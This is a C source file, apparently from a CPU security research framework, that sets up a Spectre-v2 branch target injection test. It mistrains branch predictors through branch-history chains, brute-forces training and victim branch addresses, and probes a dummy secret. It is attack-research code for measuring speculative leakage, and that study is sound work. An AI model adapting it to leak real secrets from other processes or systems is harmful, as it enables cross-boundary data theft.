#include "tests.h"

#define NR_TARGET_WARMUP_GROUPS (2)

#define LEN_BH_IND_EX (8)
#define SEARCH_BITS_OOP_BR (27)
#define SEARCH_BITS_BH_FP (6)
#define STEP_BITS_BH_FP (2)
#define STEP_BITS_OOP_BR (4)

#define NR_BST_TRAIN 2

uint64_t search_bits_oop_br = SEARCH_BITS_OOP_BR;
uint64_t search_bits_bh_fp = SEARCH_BITS_BH_FP;
uint64_t step_bits_oop_br = STEP_BITS_OOP_BR;
uint64_t step_bits_bh_fp = STEP_BITS_BH_FP;

struct argp_option options[] = 
{
    {"bits-br", 0x1000, "n", 0, "Search space of addresses of out-of-place training and victim indirect branches."},
    {"bits-fp", 0x1001, "n", 0, "Search space of indirect branch targets to be used for updating BHB."},
    {"step-br", 0x1002, "n", 0, "Step size for out-of-place training branches."},
    {"step-fp", 0x1003, "n", 0, "Step size for indirect branch targets."},
    {0}
};

static error_t parse_opt(int key, char *arg, struct argp_state *state)
{
    struct args_t *arguments = state->input;
    switch (key)
    {
    case 0x1000:
        search_bits_oop_br = strtoul(arg, NULL, 0);
        break;
    case 0x1001:
        search_bits_bh_fp = strtoul(arg, NULL, 0);
        break;
    case 0x1002:
        step_bits_oop_br = strtoul(arg, NULL, 0);
        break;
    case 0x1003:
        step_bits_bh_fp = strtoul(arg, NULL, 0);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

struct argp argp = {options, parse_opt, NULL, NULL};
struct argp_child argp_child_test[] = 
{
    {&argp, 0, "Test-specific parameters:"},
    {0}
};

void init_btb_pc_targets();

static uint64_t offsets_btb_train[NR_BST_TRAIN] = {0x10, 0x20};
uint64_t *offsets_bh_train = NULL;
uint64_t *offsets_bh_victim = NULL;
uint64_t *targets_bh_train;
uint64_t *targets_bh_victim;

uint64_t *targets_btb_train;
uint64_t *targets_bhb_pc_warmup[NR_TARGET_WARMUP_GROUPS] = {(uint64_t *)&targets_bh_train, (uint64_t *)&targets_bh_victim};

uint64_t br_train = 0;
trampoline_obj_t *tramp_br_train = NULL;
uint64_t br_victim = 0;
trampoline_obj_t *tramp_br_victim = NULL;

static bh_chain_params_t chain_leak = {
    .bh_tramp_p = &tramp_br,
    .ib_target = &t_leak,
    .bh_args_p = &targets_bh_train,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .ib_ptr_p = &ib_ptr,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P};

static bh_chain_params_t chain_safe = {
    .bh_tramp_p = &tramp_br,
    .ib_target = &t_empty,
    .bh_args_p = &targets_bh_victim,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .ib_ptr_p = &ib_ptr,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P};

test_obj_t test_spec_v2 = {
    .nr_repeat = 16,
    .nr_train_passes = 2,
    .nr_train_chains = 1,
    .train_chains = (bh_chain_params_t *[]){&chain_leak},
    .spec_chain = &chain_safe,
    .nr_dc_flush = 0,
    .dc_flush = NULL,
    .pre_train = &init_btb_pc_targets,
    .pre_spec = &t_empty,
    .nr_probes = 1,
    .probes_p = (char *[]){DUMMY_SECRET_P},
    .description = "Spectre-v2"};

run_obj_t run = {
    .nr_tests = 1,
    .bp_snippet = &asm_br_obj,
    .tests = {&test_spec_v2}};

void btb_pc_record(branch_chain_t *branches, int nr_branches, uint64_t *targets, int64_t nr_targets)
{
    for (int i = 0; i < nr_branches; i++)
        for (int j = 0; j < nr_targets; j++)
            (branches[i])(targets, j, NULL, NULL, NULL, NULL);
}

// Initialize BST entries so all involved branches update BHB
void init_btb_pc_targets()
{
    for (int i = 0; i < NR_TARGET_WARMUP_GROUPS; i++)
        btb_pc_record((branch_chain_t *)(*targets_bhb_pc_warmup[i]), args.nr_ind_bh, targets_btb_train, NR_BST_TRAIN);
}

uint64_t *init_targets(uint64_t *dummy, uint64_t len_dummy, uint64_t len_bh, trampoline_obj_t *tramp, void *last, uint64_t padding_val)
{
    uint64_t *offsets_tmp = malloc((len_bh + 1) * sizeof(uint64_t));
    int w_start = (len_bh >= len_dummy) ? len_bh - len_dummy : 0;
    int r_start = (len_bh >= len_dummy) ? 0 : len_dummy - len_bh;
    for (int i = 0; i < w_start; i++)
        offsets_tmp[i] = padding_val;
    for (int i = w_start; i < len_bh; i++)
        offsets_tmp[i] = dummy[i - w_start + r_start];
    uint64_t *targets = prep_jmp_targets(offsets_tmp, len_bh + 1, tramp);
    targets[len_bh] = (uint64_t)last;
    free(offsets_tmp);
    return targets;
}

bool next_run()
{
    if (offsets_bh_train == NULL && offsets_bh_victim == NULL)
    {
        offsets_bh_train = malloc((args.nr_ind_bh + 1) * sizeof(uint64_t));
        memset(offsets_bh_train, 0, (args.nr_ind_bh + 1) * sizeof(uint64_t));
        offsets_bh_victim = malloc((args.nr_ind_bh + 1) * sizeof(uint64_t));
        memset(offsets_bh_victim, 0, (args.nr_ind_bh + 1) * sizeof(uint64_t));
    }
    else
    {
        int overflow = 1;
        if (overflow)
        {
            br_victim = (br_victim + (overflow << step_bits_oop_br)) & ((1 << search_bits_oop_br) - 1);
            if (br_victim == 0)
            {
                overflow = 1;
            }
            else
            {
                overflow = 0;
            }
        }
        if (overflow)
        {
            br_train = (br_train + (overflow << step_bits_oop_br)) & ((1 << search_bits_oop_br) - 1);
            if (br_train == 0)
            {
                overflow = 1;
            }
            else
            {
                overflow = 0;
            }
        }
        if (overflow)
        {
            for (int check = args.nr_ind_bh - 1; check >= 0; check--)
            {
                offsets_bh_victim[check] = (offsets_bh_victim[check] + (overflow << step_bits_bh_fp)) & ((1 << search_bits_bh_fp) - 1);
                if (offsets_bh_victim[check] == 0)
                {
                    overflow = 1;
                    continue;
                }
                else
                {
                    overflow = 0;
                    break;
                }
            }
        }
        if (overflow)
        {
            for (int check = args.nr_ind_bh - 1; check >= 0; check--)
            {
                offsets_bh_train[check] = (offsets_bh_train[check] + (overflow << step_bits_bh_fp)) & ((1 << search_bits_bh_fp) - 1);
                if (offsets_bh_train[check] == 0)
                {
                    overflow = 1;
                    continue;
                }
                else
                {
                    overflow = 0;
                    break;
                }
            }
        }
        return (overflow == 0);
    }
}

void init_test_bh_chains()
{
    tramp_br_train = prep_aligned_snippet(&asm_br_obj, (void *)br_train, search_bits_oop_br);
    tramp_br_victim = prep_aligned_snippet(&asm_br_obj, (void *)br_victim, search_bits_oop_br);

    targets_bh_train = init_targets(offsets_bh_train, args.nr_ind_bh, args.nr_ind_bh + LEN_BH_IND_EX, tramp_br, tramp_br_train->jit_mem->call_entry, 0);
    targets_bh_victim = init_targets(offsets_bh_victim, args.nr_ind_bh, args.nr_ind_bh + LEN_BH_IND_EX, tramp_br, tramp_br_victim->jit_mem->call_entry, 0x10);
}

void free_test_bh_chains()
{
    free(targets_bh_train);
    free(targets_bh_victim);
    free_trampoline(tramp_br_train);
    free_trampoline(tramp_br_victim);
    tramp_br_train = NULL;
    tramp_br_victim = NULL;
}

void mistrain() {}

void init_test_evset()
{
    targets_btb_train = prep_jmp_targets(offsets_btb_train, NR_BST_TRAIN, tramp_ret);
}

void free_test_evset()
{
    free(targets_btb_train);
}

void print_test_info()
{
    printf("%6x + ( ", br_train);
    for (int i = 0; i < args.nr_ind_bh; i++)
        printf("%2x ", offsets_bh_train[i]);
    printf(") ");
    printf("%6x + ( ", br_victim);
    for (int i = 0; i < args.nr_ind_bh; i++)
        printf("%2x ", offsets_bh_victim[i]);
    printf(") ");
}